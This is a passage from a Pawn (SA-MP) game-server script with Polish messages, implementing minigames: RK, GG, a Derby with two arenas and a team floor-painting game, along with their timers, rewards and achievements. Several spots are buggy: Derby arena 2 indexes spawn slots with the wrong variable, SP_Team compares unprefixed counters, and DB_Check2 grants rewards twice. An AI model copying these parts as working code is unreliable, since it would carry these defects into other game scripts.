				case 4: SetPlayerHealth(playerid, 100.0);
	        }
	    }
	    if(!IsPlayerInArea(playerid, 1103.7943, -2072.2649, 1210.0850, -1993.2859) && OnGame[playerid] == RK && RKOK[playerid])
	    {
	        SendClientMessage(playerid, RED, ""C_RED"Zosta³eœ wyrzucony za wyjœcie po za teren walki.");
			WypiszZabawa(playerid);
	    }
	}
	if(RKPlayers == 1)
	{
	    Loop(playerid, MAX_PLAYERS)
	    {
 			if(OnGame[playerid] == RK)
		    {
 				AddExp(playerid, 50);
    			Player[playerid][Cash] += 5000;
    			new msgstr[256];
    			format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/RK"C_ZABAWA".", Player[playerid][Name], playerid);
    			SendClientMessageToAll(-1, msgstr);
    			Player[playerid][Zabawyp]++;
     			if(pAch[playerid][18] < 1) {
    			    if(Player[playerid][Zabawyp] >= 100 && pAch[playerid][18] < 1) {
						pAch[playerid][18] = 1;
						AddExp(playerid, 200);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			    if(Player[playerid][Zabawyp] >= 250 && pAch[playerid][18] < 2) {
						pAch[playerid][18] = 2;
						AddExp(playerid, 400);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			    if(Player[playerid][Zabawyp] >= 500 && pAch[playerid][18] < 3) {
						pAch[playerid][18] = 3;
						AddExp(playerid, 600);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
			}
		}
		RK_End();
	}
	return 1;
}

forward RK_End();
public RK_End()
{
	KillTimer(RKTimer);
	Startuje[RK] = false;
	Osoby[RK] = 0;
	Wystartowala[RK] = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == RK) {
	    	RKOK[playerid] = false;
	    	WypiszZabawa(playerid);
 	    	OnGame[playerid] = -1;
			GangZoneHideForPlayer(playerid, RKZone);
	    	ResetPlayerWeapons(playerid);
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); }
	}
	RefreshZabawy();
}

forward GG_Start();
public GG_Start()
{
	if(Osoby[GG] < Min[GG])
	{
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == GG) OnGame[playerid] = -1; }
	    Startuje[GG] = false;
 	    return RefreshZabawy();
	}
	GGPlayers = 0;
	Wystartowala[GG] = true;
	Startuje[GG] = false;
	GGMinX = 1300.8022;
	GGMinY = 2100.2563;
	GGMaxX = 1397.1654;
	GGMaxY = 2198.6499;
	GGZone = GangZoneCreate(GGMinX, GGMinY, GGMaxX, GGMaxY);
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == GG) {
	        ForceObj(playerid);
	        SetPlayerVirtualWorld(playerid, 41);
	        switch(random(5))
	        {
	            case 0: SetPlayerPos(playerid, 1307.2217,2173.7515,11.0234);
	            case 1: SetPlayerPos(playerid, 1355.4056,2163.7725,11.0156);
	            case 2: SetPlayerPos(playerid, 1366.6191,2195.6145,9.7578);
	            case 3: SetPlayerPos(playerid, 1388.0197,2165.0005,11.0234);
	            case 4: SetPlayerPos(playerid, 1367.4817,2110.6580,11.0156);
			}
      		if(HPTimering[playerid] || ArmorTimering[playerid]) {
	    		HPTimer[playerid] = 0;
	    		ArmorTimer[playerid] = 0;
	    		HPTimering[playerid] = false;
	    		ArmorTimering[playerid] = false;
	    		Sound(playerid, 17002, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, RED, "Proces uzdrawiania siê/kupna kamizelki przerwany."); }
			GGLevel[playerid] = 1;
	        GGPlayers++;
			GangZoneShowForPlayer(playerid, GGZone, 0xFFFFFFFF);
			GangZoneFlashForPlayer(playerid,GGZone, 0xF44242FF);
	        SetPlayerArmour(playerid, 0.0);
	        SetPlayerHealth(playerid, 100.0);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 22, 7999);
		}
	}
	GGTimer = SetTimer("GG_Check", 3500, 1);
	RefreshZabawy();
	return 1;
}

forward GG_Check();
public GG_Check()
{
	if(!Wystartowala[GG]) return 1;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(!IsPlayerInArea(playerid, GGMinX, GGMinY, GGMaxX, GGMaxY) && OnGame[playerid] == GG && !IsDead[playerid])
	    {
	        GGWarn[playerid]++;
	        if(GGWarn[playerid] >= 3) {
	        	SendClientMessage(playerid, RED, ""C_RED"Zosta³eœ wyrzucony za wyjœcie po za teren walki.");
				GGPlayers--;
				WypiszZabawa(playerid); }
	    }
	    if(IsPlayerInArea(playerid, GGMinX, GGMinY, GGMaxX, GGMaxY) && OnGame[playerid] == GG) GGWarn[playerid] = 0;
	}
	if(GGPlayers == 1)
	{
	    Loop(playerid, MAX_PLAYERS)
	    {
 			if(OnGame[playerid] == GG)
		    {
 				AddExp(playerid, 200);
    			Player[playerid][Cash] += 20000;
    			new msgstr[256];
    			format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/GG"C_ZABAWA".", Player[playerid][Name], playerid);
    			SendClientMessageToAll(-1, msgstr);
    			Player[playerid][Zabawyp]++;
     			if(pAch[playerid][18] < 1) {
    			    if(Player[playerid][Zabawyp] >= 100 && pAch[playerid][18] < 1) {
						pAch[playerid][18] = 1;
						AddExp(playerid, 200);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			    if(Player[playerid][Zabawyp] >= 250 && pAch[playerid][18] < 2) {
						pAch[playerid][18] = 2;
						AddExp(playerid, 400);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			    if(Player[playerid][Zabawyp] >= 500 && pAch[playerid][18] < 3) {
						pAch[playerid][18] = 3;
						AddExp(playerid, 600);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
			}
		}
		GG_End();
	}
	return 1;
}

forward GG_End();
public GG_End()
{
	KillTimer(GGTimer);
	Startuje[GG] = false;
	Osoby[GG] = 0;
	Wystartowala[GG] = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == GG) {
	    	WypiszZabawa(playerid);
   	    	OnGame[playerid] = -1;
			GangZoneHideForPlayer(playerid, GGZone);
	    	ResetPlayerWeapons(playerid);
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); }
	}
	RefreshZabawy();
}

CreateDerbyVehicle(playerid, modelid, Float:thePos[4]) {
	pVeh[playerid] = CreateVehicle(modelid, thePos[0], thePos[1], thePos[2], thePos[3], random(200), random(200), -1);
	SetVehicleVirtualWorld(pVeh[playerid], 64);
	SetVehicleHealth(pVeh[playerid], 9999.0);
	SetPlayerVirtualWorld(playerid, 64);
	PutPlayerInVehicle(playerid, pVeh[playerid], 0); }
forward DB_Start();
public DB_Start()
{
	if(Osoby[DB] < Min[DB])
	{
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == DB) OnGame[playerid] = -1; }
	    Startuje[DB] = false;
 	    return RefreshZabawy();
	}
	Wystartowala[DB] = true;
	Startuje[DB] = false;
	DBPlayers = 0;
	switch(random(2))
	{
	    case 0:
		{
        	new slotid, Float:derbyCar[][] =
			{
				{1779.8816, 786.7270, 85.4310, 0.0000},
				{1797.9170, 786.8137, 85.4310, 0.0000},
				{1762.0829, 786.9311, 85.4310, 0.0000},
				{1780.2524, 884.4388, 85.4310, 178.0000},
				{1796.5348, 885.4540, 85.4310, 178.0000},
				{1762.6359, 886.4955, 85.4310, 178.0000},
				{1780.2874, 814.7385, 85.4310, 0.0000},
				{1779.7322, 857.7954, 85.4310, 178.0000},
				{1766.5150, 836.4465, 85.4310, 178.0000}
			}, Iterator:randomPos<9>;
			f_Itter(randomPos);

			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == DB)
			    {
			        DBPlayers++;
	        		ForceObj(playerid);
					slotid = Iter_Random(randomPos);
					Iter_Remove(randomPos, slotid);
	    			ResetPlayerWeapons(playerid);
					if(vSpawned[playerid]) {
						DestroyVehicle(pVeh[playerid]);
						vSpawned[playerid] = false; }
    				CreateDerbyVehicle(playerid, 557, derbyCar[slotid]);
    				new Float:unusedFloat, Float:pos_z;
				    if(IsPlayerInVehicle(playerid, pVeh[playerid]) || pos_z < 80.0)
				    {
				        new Float:p[2];
				        GetVehiclePos(pVeh[playerid], p[0], p[1], unusedFloat);
						SetVehiclePos(pVeh[playerid], p[0], p[1], 85.0);
					}
					TogglePlayerControllable(playerid, 0);
	    			SetTimerEx("unfreezePlayer", 2500, 0, "i", playerid);
					new dbinfostr[256];
					format(dbinfostr, sizeof(dbinfostr), ""C_WHITE"["C_ZABAWA"Derby"C_WHITE"] {F5F96B}Wylosowana arena: "C_WHITE"Monster LV {F5F96B}autorstwa "C_WHITE"KamiLu{F5F96B}. ("C_WHITE"1{F5F96B})");
					SendClientMessage(playerid, -1, dbinfostr);
				}
			}
			DBTimer = SetTimer("DB_Check1", 2000, 1);
		}
	    case 1:
		{
        	new slot2id, Float:derbyCar2[][] =
			{
				{269.2351, 1755.0972, 290.9218, 0.0000},
				{268.6405, 1785.3530, 290.9218, -181.0000},
				{227.8626, 1635.5754, 290.3958, -40.0000},
				{256.1813, 1631.1316, 284.3208, 222.0400},
				{353.1870, 1629.2078, 289.2076, 29.0000},
				{337.6456, 1652.1088, 288.7076, 215.0000},
				{338.3342, 1741.6112, 289.8669, -55.0000},
				{361.2838, 1758.5017, 289.8669, 127.0000},
				{380.9358, 1732.7666, 289.8669, 127.0000}
			}, Iterator:randomPos<9>;
			f_Itter(randomPos);

			Loop(playerid, MAX_PLAYERS)
			{
			    if(OnGame[playerid] == DB)
			    {
			        DBPlayers++;
			    	ForceObj(playerid);
					slot2id = Iter_Random(randomPos);
					Iter_Remove(randomPos, slot2id);
	    			ResetPlayerWeapons(playerid);
					if(vSpawned[playerid]) {
						DestroyVehicle(pVeh[playerid]);
						vSpawned[playerid] = false; }
    				CreateDerbyVehicle(playerid, 494, derbyCar2[slotid]);
    				new Float:unusedFloat, Float:pos_z;
				    if(IsPlayerInVehicle(playerid, pVeh[playerid]) || pos_z < 280.0)
				    {
				        new Float:p[2];
				        GetVehiclePos(pVeh[playerid], p[0], p[1], unusedFloat);
						SetVehiclePos(pVeh[playerid], p[0], p[1], 290.0);
					}
					TogglePlayerControllable(playerid, 0);
	    			SetTimerEx("unfreezePlayer", 2500, 0, "i", playerid);
					new dbinfostr[256];
					format(dbinfostr, sizeof(dbinfostr), ""C_WHITE"["C_ZABAWA"Derby"C_WHITE"] {F5F96B}Wylosowana arena: "C_WHITE"Cloudy Hotring {F5F96B}autorstwa "C_WHITE"KamiLu{F5F96B}. ("C_WHITE"2{F5F96B})");
					SendClientMessage(playerid, -1, dbinfostr);
				}
			}
			DBTimer = SetTimer("DB_Check2", 2000, 1);
		}
	}
	RefreshZabawy();
	return 1;
}

forward DB_Check1();
public DB_Check1()
{
	if(Wystartowala[DB])
	{
	    new Float:unusedFloat, Float:pos_z;

		Loop(x, MAX_PLAYERS)
		{
			if(OnGame[x] == DB)
			{
			    GetVehiclePos(GetPlayerVehicleID(x), unusedFloat, unusedFloat, pos_z);
				if(!IsPlayerInVehicle(x, pVeh[x]) || pos_z < 80.0) WypiszZabawa(x);
			}
		}
		if(DBPlayers == 0) {
			DB_End();
			KillTimer(DBTimer);
   			new msgstr[256];
    		format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_ZABAWA"Zabawa "C_WHITE"/DB"C_ZABAWA" zosta³a zakoñczona. Wszyscy gracze zostali zrzuceni.");
   			return SendClientMessageToAll(-1, msgstr); }
		if(DBPlayers < 2)
		{
			KillTimer(DBTimer);
		    Loop(loopid, MAX_PLAYERS)
			{
				if(OnGame[loopid] == DB)
				{
    				new msgstr[256];
    				format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/DB"C_ZABAWA".", Player[loopid][Name], loopid);
    				SendClientMessageToAll(-1, msgstr);
					AddExp(loopid, 50);
					Player[loopid][Zabawyp]++;
     				if(pAch[loopid][18] < 1) {
    			    	if(Player[loopid][Zabawyp] >= 100 && pAch[loopid][18] < 1) {
							pAch[loopid][18] = 1;
							AddExp(loopid, 200);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			    	if(Player[loopid][Zabawyp] >= 250 && pAch[loopid][18] < 2) {
							pAch[loopid][18] = 2;
							AddExp(loopid, 400);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			    	if(Player[loopid][Zabawyp] >= 500 && pAch[loopid][18] < 3) {
							pAch[loopid][18] = 3;
							AddExp(loopid, 600);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
					SetTimer("DB_End", 1000, 0);
				}
		    }
		}
	}
	else KillTimer(DBTimer);
	return 1;
}

forward DB_Check2();
public DB_Check2()
{
	if(Wystartowala[DB])
	{
	    new Float:unusedFloat, Float:pos_z;

		Loop(x, MAX_PLAYERS)
		{
			if(OnGame[x] == DB)
			{
			    GetVehiclePos(GetPlayerVehicleID(x), unusedFloat, unusedFloat, pos_z);
				if(!IsPlayerInVehicle(x, pVeh[x]) || pos_z < 280.0) WypiszZabawa(x);
			}
		}
		if(DBPlayers == 0) {
			DB_End();
			KillTimer(DBTimer);
   			new msgstr[256];
    		format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_ZABAWA"Zabawa "C_WHITE"/DB"C_ZABAWA" zosta³a zakoñczona. Wszyscy gracze zostali zrzuceni.");
   			return SendClientMessageToAll(-1, msgstr); }
		if(DBPlayers < 2)
		{
			KillTimer(DBTimer);
		    Loop(loopid, MAX_PLAYERS)
			{
				if(OnGame[loopid] == DB)
				{
    				new msgstr[256];
    				format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/DB"C_ZABAWA".", Player[loopid][Name], loopid);
    				SendClientMessageToAll(-1, msgstr);
					AddExp(loopid, 50);
					Player[loopid][Zabawyp]++;
     				if(pAch[loopid][18] < 1) {
    			    	if(Player[loopid][Zabawyp] >= 100 && pAch[loopid][18] < 1) {
							pAch[loopid][18] = 1;
							AddExp(loopid, 200);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			   		if(Player[loopid][Zabawyp] >= 250 && pAch[loopid][18] < 2) {
							pAch[loopid][18] = 2;
							AddExp(loopid, 400);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			    	if(Player[loopid][Zabawyp] >= 500 && pAch[loopid][18] < 3) {
							pAch[loopid][18] = 3;
							AddExp(loopid, 600);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
					SetTimer("DB_End", 1000, 0);
					AddExp(loopid, 50);
					Player[loopid][Zabawyp]++;
     				if(pAch[loopid][18] < 1) {
    			    	if(Player[loopid][Zabawyp] >= 100 && pAch[loopid][18] < 1) {
							pAch[loopid][18] = 1;
							AddExp(loopid, 200);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			   		if(Player[loopid][Zabawyp] >= 250 && pAch[loopid][18] < 2) {
							pAch[loopid][18] = 2;
							AddExp(loopid, 400);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			    	if(Player[loopid][Zabawyp] >= 500 && pAch[loopid][18] < 3) {
							pAch[loopid][18] = 3;
							AddExp(loopid, 600);
							Sound(loopid,1137,0.0,0.0,0.0);
							SendClientMessageEx(loopid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
					SetTimer("DB_End", 1000, 0);
				}
		    }
		}
	}
	else KillTimer(DBTimer);
	return 1;
}

forward DB_End();
public DB_End()
{
	Startuje[DB] = false;
	Osoby[DB] = 0;
	Wystartowala[DB] = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == DB) {
			if(IsPlayerInAnyVehicle(playerid)) DestroyVehicle(pVeh[playerid]);
	    	WypiszZabawa(playerid);
 	    	OnGame[playerid] = -1;
	   		ResetPlayerWeapons(playerid);
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); }
	}
	RefreshZabawy();
	return 1;
}

CreatePlatform(Float:x, Float:y)
{
	if(createdplatforms >= MAX_PLATFORMY) return 1;
	SPo[createdplatforms] = CreateDynamicObject(19377, x, y, 11.598924, 0.000000, 90.000000, 0.000000, 111, -1, -1, 300.00, 300.00);
	SetDynamicObjectMaterial(SPo[createdplatforms], 0, 10765, "airportgnd_sfse", "white", 0x00000000);
	SPoOnMap[createdplatforms] = true;
    SPoTType[createdplatforms] = 0;
	createdplatforms++;
	return 1;
}

forward SP_Start();
public SP_Start()
{
	if(Osoby[SP] < Min[SP])
	{
		Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == SP) OnGame[playerid] = -1; }
	    Startuje[SP] = false;
 	    return RefreshZabawy();
	}
	SPattackers = 0;
	SPdeffenders = 0;
	Wystartowala[SP] = true;
	Startuje[SP] = false;
	SPPlayers = 0;
	createdplatforms = 0;
	PunktyRedzi = 0;
	PunktyBlue = 0;
	Loop(platformid, MAX_PLATFORMY)
	{
	    if(SPoOnMap[platformid])
	    {
	        SPoOnMap[platformid] = false;
	        DestroyDynamicObject(SPo[platformid]);
	    }
	}
	CreatePlatform(4312.224121, 1497.961181);
	CreatePlatform(4322.684570, 1497.961181);
	CreatePlatform(4333.175781, 1497.961181);
	CreatePlatform(4343.667480, 1497.961181);
	CreatePlatform(4354.169433, 1497.961181);
	CreatePlatform(4354.169433, 1507.591674);
	CreatePlatform(4354.169433, 1517.210815);
	CreatePlatform(4343.665039, 1517.210815);
	CreatePlatform(4333.172363, 1517.210815);
	CreatePlatform(4322.702148, 1517.210815);
	CreatePlatform(4312.221191, 1517.210815);
	CreatePlatform(4312.221191, 1507.581298);
	CreatePlatform(4322.695800, 1507.581298);
	CreatePlatform(4333.191894, 1507.581298);
	CreatePlatform(4343.684570, 1507.581298);
	CreatePlatform(4354.167968, 1526.841064);
	CreatePlatform(4343.685546, 1526.841064);
	CreatePlatform(4333.211425, 1526.841064);
	CreatePlatform(4322.721679, 1526.841064);
	CreatePlatform(4312.240234, 1526.841064);
	CreatePlatform(4354.167968, 1536.450439);
	CreatePlatform(4343.707519, 1536.450439);
	CreatePlatform(4333.255371, 1536.450439);
	CreatePlatform(4322.752441, 1536.450439);
	CreatePlatform(4312.233886, 1536.450439);
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == SP) {
	        ForceObj(playerid);
	        SPPlayers++;
	        SetPlayerVirtualWorld(playerid, 111);
			ResetPlayerWeapons(playerid);
			SetPlayerHealth(playerid, 100.0);
			SetPlayerArmour(playerid, 100.0);
	        new infostr[256];
	        format(infostr, sizeof(infostr), ""PYTAJNIK""C_ORANGE"Strzelaj w pod³ogê barwi¹c j¹ na kolor swojej dru¿yny.");
			SendClientMessage(playerid, -1, infostr);
			switch(random(4))
			{
				case 0: SetTimerEx("SP_Team", 100, false, "i", playerid);
				case 1: SetTimerEx("SP_Team", 90, false, "i", playerid);
				case 2: SetTimerEx("SP_Team", 75, false, "i", playerid);
				case 3: SetTimerEx("SP_Team", 115, false, "i", playerid);
			}
			TogglePlayerControllable(playerid, 0);
			GivePlayerWeapon(playerid, 32, 9999);
			GivePlayerWeapon(playerid, 16, 9999);
			TextDrawSetString(SPTD, "~b~~h~/SP ~w~~h~| ~r~~h~0~w~~h~-~b~~h~0");
			TextDrawShowForPlayer(playerid, SPTD);
			SetTimerEx("unfreezePlayer", 2000, 0, "i", playerid);
		}
	}
	RefreshZabawy();
	SPTimer = SetTimer("SP_Check", 1000*90, 0);
	return 1;
}

forward SP_Team(playerid);
public SP_Team(playerid)
{
	if(SPdeffenders == SPattackers)
	{
		switch(random(2))
  		{
  			case 0: {
				SPTeam[playerid] = 1;
				SetPlayerColor(playerid, 0xFF0000FF);
				SetPlayerPos(playerid, 4355.7207,1497.9121,12.6849);
	        	SetPlayerVirtualWorld(playerid, 111);
				SetPlayerHealth(playerid, 100.0);
				SetPlayerArmour(playerid, 100.0);
				SendClientMessage(playerid, RED, ""PYTAJNIK"{FF0000}Zosta³eœ przydzielony do dru¿yny czerwonych.");
				return SPattackers++; }
	        case 1: {
				SPTeam[playerid] = 2;
				SetPlayerColor(playerid, 0x00AEFFFF);
				SetPlayerPos(playerid, 4310.9463,1536.6780,12.6849);
	        	SetPlayerVirtualWorld(playerid, 111);
				SetPlayerHealth(playerid, 100.0);
				SetPlayerArmour(playerid, 100.0);
				SendClientMessage(playerid, RED, ""PYTAJNIK"{00AEFF}Zosta³eœ przydzielony do dru¿yny niebieskich.");
				return SPdeffenders++; }
		}
	}
	if(deffenders > attackers)
	{
		SPTeam[playerid] = 1;
		SetPlayerColor(playerid, 0xFF0000FF);
		SetPlayerPos(playerid, 4355.7207,1497.9121,12.6849);
    	SetPlayerVirtualWorld(playerid, 111);
		SetPlayerHealth(playerid, 100.0);
		SetPlayerArmour(playerid, 100.0);
		SendClientMessage(playerid, RED, ""PYTAJNIK"{FF0000}Zosta³eœ przydzielony do dru¿yny czerwonych.");
		return SPattackers++;
	}
	else
	{
		SPTeam[playerid] = 2;
		SetPlayerColor(playerid, 0x00AEFFFF);
		SetPlayerPos(playerid, 4310.9463,1536.6780,12.6849);
	   	SetPlayerVirtualWorld(playerid, 111);
		SetPlayerHealth(playerid, 100.0);
		SetPlayerArmour(playerid, 100.0);
		SendClientMessage(playerid, RED, ""PYTAJNIK"{00AEFF}Zosta³eœ przydzielony do dru¿yny niebieskich.");
		return SPdeffenders++;
	}
}

forward SP_Check();
public SP_Check()
{
	if(!Wystartowala[SP]) return 1;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == SP)
	    {
	      	TextDrawHideForPlayer(playerid, SPTD);
	        SpecToggle(playerid, true);
	        InterpolateCameraPos(playerid, 4328.137695, 1516.736206, 12.684861, 4325.388671, 1525.533203, 119.446640, 3000);
			InterpolateCameraLookAt(playerid, 4328.303710, 1516.333251, 7.703887, 4325.392089, 1525.097412, 114.465667, 3000);
	    }
	}
	SetTimer("SP_DelLoser", 1000*3, 0);
	SetTimer("SP_WinnerEnd", 1000*8, 0);
	return 1;
}

forward SP_DelLoser();
public SP_DelLoser()
{
	if(PunktyRedzi > PunktyBlue)
	{
	    Loop(pl, MAX_PLATFORMY)
	    {
	        if(SPoTType[pl] == 2) {
	            SPoTType[pl] = 0;
	            SPoOnMap[pl] = false;
	            DestroyDynamicObject(SPo[pl]); }
			Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == SP) Sound(playerid, 1148, 0.0, 0.0, 0.0); }
	    }
	}
	if(PunktyBlue > PunktyRedzi)
	{
	    Loop(pl, MAX_PLATFORMY)
	    {
	        if(SPoTType[pl] == 1) {
	            SPoTType[pl] = 0;
	            SPoOnMap[pl] = false;
	            DestroyDynamicObject(SPo[pl]); }
			Loop(playerid, MAX_PLAYERS) { if(OnGame[playerid] == SP) Sound(playerid, 1148, 0.0, 0.0, 0.0); }
	    }
	}
}

forward SP_Stats();
public SP_Stats() {
	new spstr[128];
	format(spstr, sizeof(spstr), "~b~~h~/SP ~w~~h~| ~r~~h~%d~w~~h~-~b~~h~%d", PunktyRedzi, PunktyBlue);
	TextDrawSetString(SPTD, spstr); }

forward SP_WinnerEnd();
public SP_WinnerEnd()
{
	if(PunktyRedzi > PunktyBlue)
	{
	    SendClientMessageToAll(-1, ""C_RED"Zabawê "C_WHITE"/SP "C_RED"wygrywa dru¿yna czerwonych!");
		Loop(playerid, MAX_PLAYERS) {
			if(SPTeam[playerid] == 1) {
				AddExp(playerid, 50);
			 	Player[playerid][Zabawyp]++;
     			if(pAch[playerid][18] < 1) {
    			   	if(Player[playerid][Zabawyp] >= 100 && pAch[playerid][18] < 1) {
						pAch[playerid][18] = 1;
						AddExp(playerid, 200);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			   	if(Player[playerid][Zabawyp] >= 250 && pAch[playerid][18] < 2) {
						pAch[playerid][18] = 2;
						AddExp(playerid, 400);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			   	if(Player[playerid][Zabawyp] >= 500 && pAch[playerid][18] < 3) {
						pAch[playerid][18] = 3;
						AddExp(playerid, 600);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } } } }
	}
	if(PunktyBlue > PunktyRedzi)
	{
	    SendClientMessageToAll(-1, "{4AA0E8}Zabawê "C_WHITE"/SP {4AA0E8}wygrywa dru¿yna niebieskich!");
		Loop(playerid, MAX_PLAYERS) {
			if(SPTeam[playerid] == 2) {
				AddExp(playerid, 50);
			 	Player[playerid][Zabawyp]++;
     			if(pAch[playerid][18] < 1) {
    			   	if(Player[playerid][Zabawyp] >= 100 && pAch[playerid][18] < 1) {
						pAch[playerid][18] = 1;
						AddExp(playerid, 200);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			   	if(Player[playerid][Zabawyp] >= 250 && pAch[playerid][18] < 2) {
						pAch[playerid][18] = 2;
						AddExp(playerid, 400);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			   	if(Player[playerid][Zabawyp] >= 500 && pAch[playerid][18] < 3) {
						pAch[playerid][18] = 3;
						AddExp(playerid, 600);
						Sound(playerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } } } }
	}
	if(PunktyBlue == PunktyRedzi) {
	    SendClientMessageToAll(-1, ""C_ZABAWA"Zabawa "C_WHITE"/SP "C_ZABAWA"zakoñczona remisem."); }
	Loop(playerid, MAX_PLAYERS) SpecToggle(playerid, false);
	Osoby[SP] = 0;
	SP_End();
}

forward SP_End();
public SP_End()
{
	KillTimer(SPTimer);
	Startuje[SP] = false;
	Osoby[SP] = 0;
	Wystartowala[SP] = false;
	Loop(playerid, MAX_PLAYERS)
	{
	    if(OnGame[playerid] == SP) {
	    	WypiszZabawa(playerid);
 	    	OnGame[playerid] = -1;
	        SPTeam[playerid] = 0;
	   		ResetPlayerWeapons(playerid);
	    	SetPlayerHealth(playerid, 100.0);
	    	SetPlayerArmour(playerid, 100.0);
	    	SetPlayerVirtualWorld(playerid, 0);
			SpawnPlayer(playerid);
			SpawnFunction(playerid); }
	}
	RefreshZabawy();
}

CMD:flo(playerid, params[]) return cmd_rsp(playerid, "");
CMD:rsp(playerid, params[])
{
	if(GetPVarInt(playerid,"rsp") > gettime()) return 1;
	new Float:z, Float:unusedFloat;
